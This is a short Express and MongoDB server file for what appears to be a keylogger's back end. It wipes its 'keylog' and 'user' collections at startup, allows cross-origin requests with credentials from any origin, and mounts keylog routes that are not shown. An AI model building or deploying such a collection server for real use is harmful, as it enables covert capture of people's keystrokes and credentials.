require('dotenv').config();
var express = require('express');
const path=require('path');
var app = express();
const mongoose=require('mongoose');
var cors = require('cors');

app.use(cors({ origin: true, credentials: true }));

var db=String(process.env.DB_URL);

var keylog=require('./database').keylog;
var user=require('./database').user;
var keylogRoutes=require('./keylogRoutes');

//*****************************************/
const connect = mongoose
  .connect(db,  { useFindAndModify: false,useUnifiedTopology:true,useNewUrlParser:true })
  .then(() => {
      console.log("Mondo db connected....")
      keylog.deleteMany({},function(err,res){
        if(err){
            console.log("Error clearing keylogs collection in DB");
        }
        else{
            console.log("Cleared all keylogs Collection")
        }
    });
    user.deleteMany({},function(err,res){
        if(err){
            console.log("Error users collection in DB");
        }
        else{
            console.log("Cleared all users Collection")
        }
    });
  })
//****************************************/


app.use(express.urlencoded({extended:true}));
//static folder
app.use(express.static(path.join(__dirname,'views')));

app.use('/', keylogRoutes);

const PORT=process.env.PORT || 3000;
 app.listen(PORT,()=>{
     console.log("Listening at port 3000")
 });

